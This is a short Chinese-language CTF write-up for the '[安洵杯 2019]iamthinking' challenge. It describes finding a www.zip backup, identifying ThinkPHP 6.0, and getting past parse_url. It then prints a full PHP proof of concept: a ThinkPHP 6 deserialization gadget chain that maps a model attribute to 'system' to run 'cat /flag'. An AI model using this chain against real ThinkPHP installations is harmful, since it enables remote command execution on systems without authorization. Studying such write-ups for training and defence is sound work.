# 原创
：  [安洵杯 2019]iamthinking

# [安洵杯 2019]iamthinking

#### [安洵杯 2019]iamthinking

## 考点

> 
反序列化


## 思路

> 
打开题目显示：You don’t have permission to access this resource.<br/> 试着扫一下有没有备份文件，得到www.zip<br/> 通过备份文件我们知道是ThinkPHP 6.0版本<br/> 审计源码，构造thinkphp6反序列化，同时需要绕过parse_url


## Payload

> 
Poc


```
&lt;?php
namespace think {

    use think\model\concern\Attribute;
    use think\model\concern\Conversion;
    use think\model\concern\RelationShip;


    abstract class Model
    {
        use Conversion;
        use RelationShip;
        use Attribute;

        private $lazySave;
        protected $table;
        public function __construct($obj)
        {
            $this-&gt;lazySave = true;
            $this-&gt;table = $obj;
            $this-&gt;visible = array(array('hu3sky'=&gt;'aaa'));
            $this-&gt;relation = array("hu3sky"=&gt;'aaa');
            $this-&gt;data = array("a"=&gt;'cat /flag');
            $this-&gt;withAttr = array("a"=&gt;"system");
        }
    }
}

namespace think\model\concern {
    trait Conversion
    {
        protected $visible;
    }

    trait RelationShip
    {
        private $relation;
    }

    trait Attribute
    {
        private $data;
        private $withAttr;
    }
}

namespace think\model {
    class Pivot extends \think\Model
    {
    }
}

namespace {
    $a = new think\model\Pivot('');
    $b = new think\model\Pivot($a);

    echo urlencode(serialize($b));
}

```
